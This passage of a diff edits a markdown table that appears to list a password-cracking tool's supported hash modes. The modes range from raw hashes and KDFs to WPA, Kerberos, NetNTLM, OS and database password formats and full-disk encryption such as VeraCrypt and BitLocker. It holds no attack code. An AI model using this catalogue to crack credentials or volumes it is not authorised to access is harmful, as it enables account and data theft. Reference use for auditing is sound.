-| 25500 | Stargazer Stellar Wallet XLM                                         | Cryptocurrency Wallet                 |
-| 16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256                         | Cryptocurrency Wallet                 |
-| 15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256                                  | Cryptocurrency Wallet                 |
-| 15700 | Ethereum Wallet, SCRYPT                                              | Cryptocurrency Wallet                 |
-| 22500 | MultiBit Classic .key (MD5)                                          | Cryptocurrency Wallet                 |
-| 27700 | MultiBit Classic .wallet (scrypt)                                    | Cryptocurrency Wallet                 |
-| 22700 | MultiBit HD (scrypt)                                                 | Cryptocurrency Wallet                 |
-| 28200 | Exodus Desktop Wallet (scrypt)                                       | Cryptocurrency Wallet                 |
+|     # | Name                                                            | Category                              |
+| ----: | --------------------------------------------------------------- | ------------------------------------- |
+|   900 | MD4                                                             | Raw Hash                              |
+|     0 | MD5                                                             | Raw Hash                              |
+|   100 | SHA1                                                            | Raw Hash                              |
+|  1300 | SHA2-224                                                        | Raw Hash                              |
+|  1400 | SHA2-256                                                        | Raw Hash                              |
+| 10800 | SHA2-384                                                        | Raw Hash                              |
+|  1700 | SHA2-512                                                        | Raw Hash                              |
+| 17300 | SHA3-224                                                        | Raw Hash                              |
+| 17400 | SHA3-256                                                        | Raw Hash                              |
+| 17500 | SHA3-384                                                        | Raw Hash                              |
+| 17600 | SHA3-512                                                        | Raw Hash                              |
+|  6000 | RIPEMD-160                                                      | Raw Hash                              |
+|   600 | BLAKE2b-512                                                     | Raw Hash                              |
+| 11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian                | Raw Hash                              |
+| 11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian                | Raw Hash                              |
+|  6900 | GOST R 34.11-94                                                 | Raw Hash                              |
+| 17010 | GPG (AES-128/AES-256 (SHA-1($pass)))                            | Raw Hash                              |
+|  5100 | Half MD5                                                        | Raw Hash                              |
+| 17700 | Keccak-224                                                      | Raw Hash                              |
+| 17800 | Keccak-256                                                      | Raw Hash                              |
+| 17900 | Keccak-384                                                      | Raw Hash                              |
+| 18000 | Keccak-512                                                      | Raw Hash                              |
+|  6100 | Whirlpool                                                       | Raw Hash                              |
+| 10100 | SipHash                                                         | Raw Hash                              |
+|    70 | md5(utf16le($pass))                                             | Raw Hash                              |
+|   170 | sha1(utf16le($pass))                                            | Raw Hash                              |
+|  1470 | sha256(utf16le($pass))                                          | Raw Hash                              |
+| 10870 | sha384(utf16le($pass))                                          | Raw Hash                              |
+|  1770 | sha512(utf16le($pass))                                          | Raw Hash                              |
+|   610 | BLAKE2b-512($pass.$salt)                                        | Raw Hash salted and/or iterated       |
+|   620 | BLAKE2b-512($salt.$pass)                                        | Raw Hash salted and/or iterated       |
+|    10 | md5($pass.$salt)                                                | Raw Hash salted and/or iterated       |
+|    20 | md5($salt.$pass)                                                | Raw Hash salted and/or iterated       |
+|  3800 | md5($salt.$pass.$salt)                                          | Raw Hash salted and/or iterated       |
+|  3710 | md5($salt.md5($pass))                                           | Raw Hash salted and/or iterated       |
+|  4110 | md5($salt.md5($pass.$salt))                                     | Raw Hash salted and/or iterated       |
+|  4010 | md5($salt.md5($salt.$pass))                                     | Raw Hash salted and/or iterated       |
+| 21300 | md5($salt.sha1($salt.$pass))                                    | Raw Hash salted and/or iterated       |
+|    40 | md5($salt.utf16le($pass))                                       | Raw Hash salted and/or iterated       |
+|  2600 | md5(md5($pass))                                                 | Raw Hash salted and/or iterated       |
+|  3910 | md5(md5($pass).md5($salt))                                      | Raw Hash salted and/or iterated       |
+|  3500 | md5(md5(md5($pass)))                                            | Raw Hash salted and/or iterated       |
+|  4400 | md5(sha1($pass))                                                | Raw Hash salted and/or iterated       |
+|  4410 | md5(sha1($pass).$salt)                                          | Raw Hash salted and/or iterated       |
+| 20900 | md5(sha1($pass).md5($pass).sha1($pass))                         | Raw Hash salted and/or iterated       |
+| 21200 | md5(sha1($salt).md5($pass))                                     | Raw Hash salted and/or iterated       |
+|  4300 | md5(strtoupper(md5($pass)))                                     | Raw Hash salted and/or iterated       |
+|    30 | md5(utf16le($pass).$salt)                                       | Raw Hash salted and/or iterated       |
+|   110 | sha1($pass.$salt)                                               | Raw Hash salted and/or iterated       |
+|   120 | sha1($salt.$pass)                                               | Raw Hash salted and/or iterated       |
+|  4900 | sha1($salt.$pass.$salt)                                         | Raw Hash salted and/or iterated       |
+|  4520 | sha1($salt.sha1($pass))                                         | Raw Hash salted and/or iterated       |
+| 24300 | sha1($salt.sha1($pass.$salt))                                   | Raw Hash salted and/or iterated       |
+|   140 | sha1($salt.utf16le($pass))                                      | Raw Hash salted and/or iterated       |
+| 19300 | sha1($salt1.$pass.$salt2)                                       | Raw Hash salted and/or iterated       |
+| 14400 | sha1(CX)                                                        | Raw Hash salted and/or iterated       |
+|  4700 | sha1(md5($pass))                                                | Raw Hash salted and/or iterated       |
+|  4710 | sha1(md5($pass).$salt)                                          | Raw Hash salted and/or iterated       |
+| 21100 | sha1(md5($pass.$salt))                                          | Raw Hash salted and/or iterated       |
+| 18500 | sha1(md5(md5($pass)))                                           | Raw Hash salted and/or iterated       |
+|  4500 | sha1(sha1($pass))                                               | Raw Hash salted and/or iterated       |
+|  4510 | sha1(sha1($pass).$salt)                                         | Raw Hash salted and/or iterated       |
+|  5000 | sha1(sha1($salt.$pass.$salt))                                   | Raw Hash salted and/or iterated       |
+|   130 | sha1(utf16le($pass).$salt)                                      | Raw Hash salted and/or iterated       |
+|  1410 | sha256($pass.$salt)                                             | Raw Hash salted and/or iterated       |
+|  1420 | sha256($salt.$pass)                                             | Raw Hash salted and/or iterated       |
+| 22300 | sha256($salt.$pass.$salt)                                       | Raw Hash salted and/or iterated       |
+| 20720 | sha256($salt.sha256($pass))                                     | Raw Hash salted and/or iterated       |
+| 21420 | sha256($salt.sha256_bin($pass))                                 | Raw Hash salted and/or iterated       |
+|  1440 | sha256($salt.utf16le($pass))                                    | Raw Hash salted and/or iterated       |
+| 20800 | sha256(md5($pass))                                              | Raw Hash salted and/or iterated       |
+| 20710 | sha256(sha256($pass).$salt)                                     | Raw Hash salted and/or iterated       |
+| 21400 | sha256(sha256_bin($pass))                                       | Raw Hash salted and/or iterated       |
+|  1430 | sha256(utf16le($pass).$salt)                                    | Raw Hash salted and/or iterated       |
+| 10810 | sha384($pass.$salt)                                             | Raw Hash salted and/or iterated       |
+| 10820 | sha384($salt.$pass)                                             | Raw Hash salted and/or iterated       |
+| 10840 | sha384($salt.utf16le($pass))                                    | Raw Hash salted and/or iterated       |
+| 10830 | sha384(utf16le($pass).$salt)                                    | Raw Hash salted and/or iterated       |
+|  1710 | sha512($pass.$salt)                                             | Raw Hash salted and/or iterated       |
+|  1720 | sha512($salt.$pass)                                             | Raw Hash salted and/or iterated       |
+|  1740 | sha512($salt.utf16le($pass))                                    | Raw Hash salted and/or iterated       |
+|  1730 | sha512(utf16le($pass).$salt)                                    | Raw Hash salted and/or iterated       |
+|    50 | HMAC-MD5 (key = $pass)                                          | Raw Hash authenticated                |
+|    60 | HMAC-MD5 (key = $salt)                                          | Raw Hash authenticated                |
+|   150 | HMAC-SHA1 (key = $pass)                                         | Raw Hash authenticated                |
+|   160 | HMAC-SHA1 (key = $salt)                                         | Raw Hash authenticated                |
+|  1450 | HMAC-SHA256 (key = $pass)                                       | Raw Hash authenticated                |
+|  1460 | HMAC-SHA256 (key = $salt)                                       | Raw Hash authenticated                |
+|  1750 | HMAC-SHA512 (key = $pass)                                       | Raw Hash authenticated                |
+|  1760 | HMAC-SHA512 (key = $salt)                                       | Raw Hash authenticated                |
+| 11750 | HMAC-Streebog-256 (key = $pass), big-endian                     | Raw Hash authenticated                |
+| 11760 | HMAC-Streebog-256 (key = $salt), big-endian                     | Raw Hash authenticated                |
+| 11850 | HMAC-Streebog-512 (key = $pass), big-endian                     | Raw Hash authenticated                |
+| 11860 | HMAC-Streebog-512 (key = $salt), big-endian                     | Raw Hash authenticated                |
+| 28700 | Amazon AWS4-HMAC-SHA256                                         | Raw Hash authenticated                |
+| 11500 | CRC32                                                           | Raw Checksum                          |
+| 27900 | CRC32C                                                          | Raw Checksum                          |
+| 28000 | CRC64Jones                                                      | Raw Checksum                          |
+| 18700 | Java Object hashCode()                                          | Raw Checksum                          |
+| 25700 | MurmurHash                                                      | Raw Checksum                          |
+| 27800 | MurmurHash3                                                     | Raw Checksum                          |
+| 14100 | 3DES (PT = $salt, key = $pass)                                  | Raw Cipher, Known-plaintext attack    |
+| 14000 | DES (PT = $salt, key = $pass)                                   | Raw Cipher, Known-plaintext attack    |
+| 26401 | AES-128-ECB NOKDF (PT = $salt, key = $pass)                     | Raw Cipher, Known-plaintext attack    |
+| 26402 | AES-192-ECB NOKDF (PT = $salt, key = $pass)                     | Raw Cipher, Known-plaintext attack    |
+| 26403 | AES-256-ECB NOKDF (PT = $salt, key = $pass)                     | Raw Cipher, Known-plaintext attack    |
+| 15400 | ChaCha20                                                        | Raw Cipher, Known-plaintext attack    |
+| 14500 | Linux Kernel Crypto API (2.4)                                   | Raw Cipher, Known-plaintext attack    |
+| 14900 | Skip32 (PT = $salt, key = $pass)                                | Raw Cipher, Known-plaintext attack    |
+| 11900 | PBKDF2-HMAC-MD5                                                 | Generic KDF                           |
+| 12000 | PBKDF2-HMAC-SHA1                                                | Generic KDF                           |
+| 10900 | PBKDF2-HMAC-SHA256                                              | Generic KDF                           |
+| 12100 | PBKDF2-HMAC-SHA512                                              | Generic KDF                           |
+|  8900 | scrypt                                                          | Generic KDF                           |
+|   400 | phpass                                                          | Generic KDF                           |
+| 16100 | TACACS+                                                         | Network Protocol                      |
+| 11400 | SIP digest authentication (MD5)                                 | Network Protocol                      |
+|  5300 | IKE-PSK MD5                                                     | Network Protocol                      |
+|  5400 | IKE-PSK SHA1                                                    | Network Protocol                      |
+| 25100 | SNMPv3 HMAC-MD5-96                                              | Network Protocol                      |
+| 25000 | SNMPv3 HMAC-MD5-96/HMAC-SHA1-96                                 | Network Protocol                      |
+| 25200 | SNMPv3 HMAC-SHA1-96                                             | Network Protocol                      |
+| 26700 | SNMPv3 HMAC-SHA224-128                                          | Network Protocol                      |
+| 26800 | SNMPv3 HMAC-SHA256-192                                          | Network Protocol                      |
+| 26900 | SNMPv3 HMAC-SHA384-256                                          | Network Protocol                      |
+| 27300 | SNMPv3 HMAC-SHA512-384                                          | Network Protocol                      |
+|  2500 | WPA-EAPOL-PBKDF2                                                | Network Protocol                      |
+|  2501 | WPA-EAPOL-PMK                                                   | Network Protocol                      |
+| 22000 | WPA-PBKDF2-PMKID+EAPOL                                          | Network Protocol                      |
+| 22001 | WPA-PMK-PMKID+EAPOL                                             | Network Protocol                      |
+| 16800 | WPA-PMKID-PBKDF2                                                | Network Protocol                      |
+| 16801 | WPA-PMKID-PMK                                                   | Network Protocol                      |
+|  7300 | IPMI2 RAKP HMAC-SHA1                                            | Network Protocol                      |
+| 10200 | CRAM-MD5                                                        | Network Protocol                      |
+| 16500 | JWT (JSON Web Token)                                            | Network Protocol                      |
+| 29200 | Radmin3                                                         | Network Protocol                      |
+| 19600 | Kerberos 5, etype 17, TGS-REP                                   | Network Protocol                      |
+| 19800 | Kerberos 5, etype 17, Pre-Auth                                  | Network Protocol                      |
+| 28800 | Kerberos 5, etype 17, DB                                        | Network Protocol                      |
+| 19700 | Kerberos 5, etype 18, TGS-REP                                   | Network Protocol                      |
+| 19900 | Kerberos 5, etype 18, Pre-Auth                                  | Network Protocol                      |
+| 28900 | Kerberos 5, etype 18, DB                                        | Network Protocol                      |
+|  7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                           | Network Protocol                      |
+| 13100 | Kerberos 5, etype 23, TGS-REP                                   | Network Protocol                      |
+| 18200 | Kerberos 5, etype 23, AS-REP                                    | Network Protocol                      |
+|  5500 | NetNTLMv1 / NetNTLMv1+ESS                                       | Network Protocol                      |
+| 27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                                  | Network Protocol                      |
+|  5600 | NetNTLMv2                                                       | Network Protocol                      |
+| 27100 | NetNTLMv2 (NT)                                                  | Network Protocol                      |
+| 29100 | Flask Session Cookie ($salt.$salt.$pass)                        | Network Protocol                      |
+|  4800 | iSCSI CHAP authentication, MD5(CHAP)                            | Network Protocol                      |
+|  8500 | RACF                                                            | Operating System                      |
+|  6300 | AIX {smd5}                                                      | Operating System                      |
+|  6700 | AIX {ssha1}                                                     | Operating System                      |
+|  6400 | AIX {ssha256}                                                   | Operating System                      |
+|  6500 | AIX {ssha512}                                                   | Operating System                      |
+|  3000 | LM                                                              | Operating System                      |
+| 19000 | QNX /etc/shadow (MD5)                                           | Operating System                      |
+| 19100 | QNX /etc/shadow (SHA256)                                        | Operating System                      |
+| 19200 | QNX /etc/shadow (SHA512)                                        | Operating System                      |
+| 15300 | DPAPI masterkey file v1 (context 1 and 2)                       | Operating System                      |
+| 15310 | DPAPI masterkey file v1 (context 3)                             | Operating System                      |
+| 15900 | DPAPI masterkey file v2 (context 1 and 2)                       | Operating System                      |
+| 15910 | DPAPI masterkey file v2 (context 3)                             | Operating System                      |
+|  7200 | GRUB 2                                                          | Operating System                      |
+| 12800 | MS-AzureSync PBKDF2-HMAC-SHA256                                 | Operating System                      |
+| 12400 | BSDi Crypt, Extended DES                                        | Operating System                      |
+|  1000 | NTLM                                                            | Operating System                      |
+|  9900 | Radmin2                                                         | Operating System                      |
+|  5800 | Samsung Android Password/PIN                                    | Operating System                      |
+| 28100 | Windows Hello PIN/Password                                      | Operating System                      |
+| 13800 | Windows Phone 8+ PIN/password                                   | Operating System                      |
+|  2410 | Cisco-ASA MD5                                                   | Operating System                      |
+|  9200 | Cisco-IOS $8$ (PBKDF2-SHA256)                                   | Operating System                      |
+|  9300 | Cisco-IOS $9$ (scrypt)                                          | Operating System                      |
+|  5700 | Cisco-IOS type 4 (SHA256)                                       | Operating System                      |
+|  2400 | Cisco-PIX MD5                                                   | Operating System                      |
+|  8100 | Citrix NetScaler (SHA1)                                         | Operating System                      |
+| 22200 | Citrix NetScaler (SHA512)                                       | Operating System                      |
+|  1100 | Domain Cached Credentials (DCC), MS Cache                       | Operating System                      |
+|  2100 | Domain Cached Credentials 2 (DCC2), MS Cache 2                  | Operating System                      |
+|  7000 | FortiGate (FortiOS)                                             | Operating System                      |
+| 26300 | FortiGate256 (FortiOS256)                                       | Operating System                      |
+|   125 | ArubaOS                                                         | Operating System                      |
+|   501 | Juniper IVE                                                     | Operating System                      |
+|    22 | Juniper NetScreen/SSG (ScreenOS)                                | Operating System                      |
+| 15100 | Juniper/NetBSD sha1crypt                                        | Operating System                      |
+| 26500 | iPhone passcode (UID key + System Keybag)                       | Operating System                      |
+|   122 | macOS v10.4, macOS v10.5, macOS v10.6                           | Operating System                      |
+|  1722 | macOS v10.7                                                     | Operating System                      |
+|  7100 | macOS v10.8+ (PBKDF2-SHA512)                                    | Operating System                      |
+|  3200 | bcrypt $2*$, Blowfish (Unix)                                    | Operating System                      |
+|   500 | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)                       | Operating System                      |
+|  1500 | descrypt, DES (Unix), Traditional DES                           | Operating System                      |
+| 29000 | sha1($salt.sha1(utf16le($username).':'.utf16le($pass)))         | Operating System                      |
+|  7400 | sha256crypt $5$, SHA256 (Unix)                                  | Operating System                      |
+|  1800 | sha512crypt $6$, SHA512 (Unix)                                  | Operating System                      |
+| 24600 | SQLCipher                                                       | Database Server                       |
+|   131 | MSSQL (2000)                                                    | Database Server                       |
+|   132 | MSSQL (2005)                                                    | Database Server                       |
+|  1731 | MSSQL (2012, 2014)                                              | Database Server                       |
+| 24100 | MongoDB ServerKey SCRAM-SHA-1                                   | Database Server                       |
+| 24200 | MongoDB ServerKey SCRAM-SHA-256                                 | Database Server                       |
+|    12 | PostgreSQL                                                      | Database Server                       |
+| 11100 | PostgreSQL CRAM (MD5)                                           | Database Server                       |
+| 28600 | PostgreSQL SCRAM-SHA-256                                        | Database Server                       |
+|  3100 | Oracle H: Type (Oracle 7+)                                      | Database Server                       |
+|   112 | Oracle S: Type (Oracle 11+)                                     | Database Server                       |
+| 12300 | Oracle T: Type (Oracle 12+)                                     | Database Server                       |
+|  7401 | MySQL $A$ (sha256crypt)                                         | Database Server                       |
+| 11200 | MySQL CRAM (SHA1)                                               | Database Server                       |
+|   200 | MySQL323                                                        | Database Server                       |
+|   300 | MySQL4.1/MySQL5                                                 | Database Server                       |
+|  8000 | Sybase ASE                                                      | Database Server                       |
+|  8300 | DNSSEC (NSEC3)                                                  | FTP, HTTP, SMTP, LDAP Server          |
+| 25900 | KNX IP Secure - Device Authentication Code                      | FTP, HTTP, SMTP, LDAP Server          |
+| 16400 | CRAM-MD5 Dovecot                                                | FTP, HTTP, SMTP, LDAP Server          |
+|  1411 | SSHA-256(Base64), LDAP {SSHA256}                                | FTP, HTTP, SMTP, LDAP Server          |
+|  1711 | SSHA-512(Base64), LDAP {SSHA512}                                | FTP, HTTP, SMTP, LDAP Server          |
+| 24900 | Dahua Authentication MD5                                        | FTP, HTTP, SMTP, LDAP Server          |
+| 10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)                         | FTP, HTTP, SMTP, LDAP Server          |
+| 15000 | FileZilla Server >= 0.9.55                                      | FTP, HTTP, SMTP, LDAP Server          |
+| 12600 | ColdFusion 10+                                                  | FTP, HTTP, SMTP, LDAP Server          |
+|  1600 | Apache $apr1$ MD5, md5apr1, MD5 (APR)                           | FTP, HTTP, SMTP, LDAP Server          |
+|   141 | Episerver 6.x < .NET 4                                          | FTP, HTTP, SMTP, LDAP Server          |
+|  1441 | Episerver 6.x >= .NET 4                                         | FTP, HTTP, SMTP, LDAP Server          |
+|  1421 | hMailServer                                                     | FTP, HTTP, SMTP, LDAP Server          |
+|   101 | nsldap, SHA-1(Base64), Netscape LDAP SHA                        | FTP, HTTP, SMTP, LDAP Server          |
+|   111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA                     | FTP, HTTP, SMTP, LDAP Server          |
+|  7700 | SAP CODVN B (BCODE)                                             | Enterprise Application Software (EAS) |
+|  7701 | SAP CODVN B (BCODE) from RFC_READ_TABLE                         | Enterprise Application Software (EAS) |
+|  7800 | SAP CODVN F/G (PASSCODE)                                        | Enterprise Application Software (EAS) |
+|  7801 | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE                    | Enterprise Application Software (EAS) |
+| 10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                             | Enterprise Application Software (EAS) |
+|   133 | PeopleSoft                                                      | Enterprise Application Software (EAS) |
+| 13500 | PeopleSoft PS_TOKEN                                             | Enterprise Application Software (EAS) |
+| 21500 | SolarWinds Orion                                                | Enterprise Application Software (EAS) |
+| 21501 | SolarWinds Orion v2                                             | Enterprise Application Software (EAS) |
+|    24 | SolarWinds Serv-U                                               | Enterprise Application Software (EAS) |
+|  8600 | Lotus Notes/Domino 5                                            | Enterprise Application Software (EAS) |
+|  8700 | Lotus Notes/Domino 6                                            | Enterprise Application Software (EAS) |
+|  9100 | Lotus Notes/Domino 8                                            | Enterprise Application Software (EAS) |
+| 26200 | OpenEdge Progress Encode                                        | Enterprise Application Software (EAS) |
+| 20600 | Oracle Transportation Management (SHA256)                       | Enterprise Application Software (EAS) |
+|  4711 | Huawei sha1(md5($pass).$salt)                                   | Enterprise Application Software (EAS) |
+| 20711 | AuthMe sha256                                                   | Enterprise Application Software (EAS) |
+| 22400 | AES Crypt (SHA256)                                              | Full-Disk Encryption (FDE)            |
+| 27400 | VMware VMX (PBKDF2-HMAC-SHA1 + AES-256-CBC)                     | Full-Disk Encryption (FDE)            |
+| 14600 | LUKS v1 (legacy)                                                | Full-Disk Encryption (FDE)            |
+| 29541 | LUKS v1 RIPEMD-160 + AES                                        | Full-Disk Encryption (FDE)            |
+| 29542 | LUKS v1 RIPEMD-160 + Serpent                                    | Full-Disk Encryption (FDE)            |
+| 29543 | LUKS v1 RIPEMD-160 + Twofish                                    | Full-Disk Encryption (FDE)            |
+| 29511 | LUKS v1 SHA-1 + AES                                             | Full-Disk Encryption (FDE)            |
+| 29512 | LUKS v1 SHA-1 + Serpent                                         | Full-Disk Encryption (FDE)            |
+| 29513 | LUKS v1 SHA-1 + Twofish                                         | Full-Disk Encryption (FDE)            |
+| 29521 | LUKS v1 SHA-256 + AES                                           | Full-Disk Encryption (FDE)            |
+| 29522 | LUKS v1 SHA-256 + Serpent                                       | Full-Disk Encryption (FDE)            |
+| 29523 | LUKS v1 SHA-256 + Twofish                                       | Full-Disk Encryption (FDE)            |
+| 29531 | LUKS v1 SHA-512 + AES                                           | Full-Disk Encryption (FDE)            |
+| 29532 | LUKS v1 SHA-512 + Serpent                                       | Full-Disk Encryption (FDE)            |
+| 29533 | LUKS v1 SHA-512 + Twofish                                       | Full-Disk Encryption (FDE)            |
+| 13711 | VeraCrypt RIPEMD160 + XTS 512 bit (legacy)                      | Full-Disk Encryption (FDE)            |
+| 13712 | VeraCrypt RIPEMD160 + XTS 1024 bit (legacy)                     | Full-Disk Encryption (FDE)            |
+| 13713 | VeraCrypt RIPEMD160 + XTS 1536 bit (legacy)                     | Full-Disk Encryption (FDE)            |
+| 13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)          | Full-Disk Encryption (FDE)            |
+| 13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)         | Full-Disk Encryption (FDE)            |
+| 13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)         | Full-Disk Encryption (FDE)            |
+| 29411 | VeraCrypt RIPEMD160 + XTS 512 bit                               | Full-Disk Encryption (FDE)            |
+| 29412 | VeraCrypt RIPEMD160 + XTS 1024 bit                              | Full-Disk Encryption (FDE)            |
+| 29413 | VeraCrypt RIPEMD160 + XTS 1536 bit                              | Full-Disk Encryption (FDE)            |
+| 29441 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode                   | Full-Disk Encryption (FDE)            |
+| 29442 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode                  | Full-Disk Encryption (FDE)            |
+| 29443 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode                  | Full-Disk Encryption (FDE)            |
+| 13751 | VeraCrypt SHA256 + XTS 512 bit (legacy)                         | Full-Disk Encryption (FDE)            |
+| 13752 | VeraCrypt SHA256 + XTS 1024 bit (legacy)                        | Full-Disk Encryption (FDE)            |
+| 13753 | VeraCrypt SHA256 + XTS 1536 bit (legacy)                        | Full-Disk Encryption (FDE)            |
+| 13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode (legacy)             | Full-Disk Encryption (FDE)            |
+| 13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode (legacy)            | Full-Disk Encryption (FDE)            |
+| 13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode (legacy)            | Full-Disk Encryption (FDE)            |
+| 29451 | VeraCrypt SHA256 + XTS 512 bit                                  | Full-Disk Encryption (FDE)            |
+| 29452 | VeraCrypt SHA256 + XTS 1024 bit                                 | Full-Disk Encryption (FDE)            |
+| 29453 | VeraCrypt SHA256 + XTS 1536 bit                                 | Full-Disk Encryption (FDE)            |
+| 29461 | VeraCrypt SHA256 + XTS 512 bit + boot-mode                      | Full-Disk Encryption (FDE)            |
+| 29462 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode                     | Full-Disk Encryption (FDE)            |
+| 29463 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode                     | Full-Disk Encryption (FDE)            |
+| 13721 | VeraCrypt SHA512 + XTS 512 bit (legacy)                         | Full-Disk Encryption (FDE)            |
+| 13722 | VeraCrypt SHA512 + XTS 1024 bit (legacy)                        | Full-Disk Encryption (FDE)            |
+| 13723 | VeraCrypt SHA512 + XTS 1536 bit (legacy)                        | Full-Disk Encryption (FDE)            |
+| 29421 | VeraCrypt SHA512 + XTS 512 bit                                  | Full-Disk Encryption (FDE)            |
+| 29422 | VeraCrypt SHA512 + XTS 1024 bit                                 | Full-Disk Encryption (FDE)            |
+| 29423 | VeraCrypt SHA512 + XTS 1536 bit                                 | Full-Disk Encryption (FDE)            |
+| 13771 | VeraCrypt Streebog-512 + XTS 512 bit (legacy)                   | Full-Disk Encryption (FDE)            |
+| 13772 | VeraCrypt Streebog-512 + XTS 1024 bit (legacy)                  | Full-Disk Encryption (FDE)            |
+| 13773 | VeraCrypt Streebog-512 + XTS 1536 bit (legacy)                  | Full-Disk Encryption (FDE)            |
+| 13781 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode (legacy)       | Full-Disk Encryption (FDE)            |
+| 13782 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode (legacy)      | Full-Disk Encryption (FDE)            |
+| 13783 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode (legacy)      | Full-Disk Encryption (FDE)            |
+| 29471 | VeraCrypt Streebog-512 + XTS 512 bit                            | Full-Disk Encryption (FDE)            |
+| 29472 | VeraCrypt Streebog-512 + XTS 1024 bit                           | Full-Disk Encryption (FDE)            |
+| 29473 | VeraCrypt Streebog-512 + XTS 1536 bit                           | Full-Disk Encryption (FDE)            |
+| 29481 | VeraCrypt Streebog-512 + XTS 512 bit + boot-mode                | Full-Disk Encryption (FDE)            |
+| 29482 | VeraCrypt Streebog-512 + XTS 1024 bit + boot-mode               | Full-Disk Encryption (FDE)            |
+| 29483 | VeraCrypt Streebog-512 + XTS 1536 bit + boot-mode               | Full-Disk Encryption (FDE)            |
+| 13731 | VeraCrypt Whirlpool + XTS 512 bit (legacy)                      | Full-Disk Encryption (FDE)            |
+| 13732 | VeraCrypt Whirlpool + XTS 1024 bit (legacy)                     | Full-Disk Encryption (FDE)            |
+| 13733 | VeraCrypt Whirlpool + XTS 1536 bit (legacy)                     | Full-Disk Encryption (FDE)            |
+| 29431 | VeraCrypt Whirlpool + XTS 512 bit                               | Full-Disk Encryption (FDE)            |
+| 29432 | VeraCrypt Whirlpool + XTS 1024 bit                              | Full-Disk Encryption (FDE)            |
+| 29433 | VeraCrypt Whirlpool + XTS 1536 bit                              | Full-Disk Encryption (FDE)            |
+| 23900 | BestCrypt v3 Volume Encryption                                  | Full-Disk Encryption (FDE)            |
+| 16700 | FileVault 2                                                     | Full-Disk Encryption (FDE)            |
+| 27500 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-128-XTS)                   | Full-Disk Encryption (FDE)            |
+| 27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS)                   | Full-Disk Encryption (FDE)            |
+| 20011 | DiskCryptor SHA512 + XTS 512 bit                                | Full-Disk Encryption (FDE)            |
+| 20012 | DiskCryptor SHA512 + XTS 1024 bit                               | Full-Disk Encryption (FDE)            |
+| 20013 | DiskCryptor SHA512 + XTS 1536 bit                               | Full-Disk Encryption (FDE)            |
+| 22100 | BitLocker                                                       | Full-Disk Encryption (FDE)            |
+| 12900 | Android FDE (Samsung DEK)                                       | Full-Disk Encryption (FDE)            |
+|  8800 | Android FDE <= 4.3                                              | Full-Disk Encryption (FDE)            |
+| 18300 | Apple File System (APFS)                                        | Full-Disk Encryption (FDE)            |
+|  6211 | TrueCrypt RIPEMD160 + XTS 512 bit (legacy)                      | Full-Disk Encryption (FDE)            |
+|  6212 | TrueCrypt RIPEMD160 + XTS 1024 bit (legacy)                     | Full-Disk Encryption (FDE)            |
+|  6213 | TrueCrypt RIPEMD160 + XTS 1536 bit (legacy)                     | Full-Disk Encryption (FDE)            |
+|  6241 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode (legacy)          | Full-Disk Encryption (FDE)            |
+|  6242 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode (legacy)         | Full-Disk Encryption (FDE)            |
+|  6243 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode (legacy)         | Full-Disk Encryption (FDE)            |
+| 29311 | TrueCrypt RIPEMD160 + XTS 512 bit                               | Full-Disk Encryption (FDE)            |
+| 29312 | TrueCrypt RIPEMD160 + XTS 1024 bit                              | Full-Disk Encryption (FDE)            |
+| 29313 | TrueCrypt RIPEMD160 + XTS 1536 bit                              | Full-Disk Encryption (FDE)            |
+| 29341 | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode                   | Full-Disk Encryption (FDE)            |
+| 29342 | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode                  | Full-Disk Encryption (FDE)            |
+| 29343 | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode                  | Full-Disk Encryption (FDE)            |
+|  6221 | TrueCrypt SHA512 + XTS 512 bit (legacy)                         | Full-Disk Encryption (FDE)            |
+|  6222 | TrueCrypt SHA512 + XTS 1024 bit (legacy)                        | Full-Disk Encryption (FDE)            |
+|  6223 | TrueCrypt SHA512 + XTS 1536 bit (legacy)                        | Full-Disk Encryption (FDE)            |
+| 29321 | TrueCrypt SHA512 + XTS 512 bit                                  | Full-Disk Encryption (FDE)            |
+| 29322 | TrueCrypt SHA512 + XTS 1024 bit                                 | Full-Disk Encryption (FDE)            |
+| 29323 | TrueCrypt SHA512 + XTS 1536 bit                                 | Full-Disk Encryption (FDE)            |
+|  6231 | TrueCrypt Whirlpool + XTS 512 bit (legacy)                      | Full-Disk Encryption (FDE)            |
+|  6232 | TrueCrypt Whirlpool + XTS 1024 bit (legacy)                     | Full-Disk Encryption (FDE)            |
+|  6233 | TrueCrypt Whirlpool + XTS 1536 bit (legacy)                     | Full-Disk Encryption (FDE)            |
+| 29331 | TrueCrypt Whirlpool + XTS 512 bit                               | Full-Disk Encryption (FDE)            |
+| 29332 | TrueCrypt Whirlpool + XTS 1024 bit                              | Full-Disk Encryption (FDE)            |
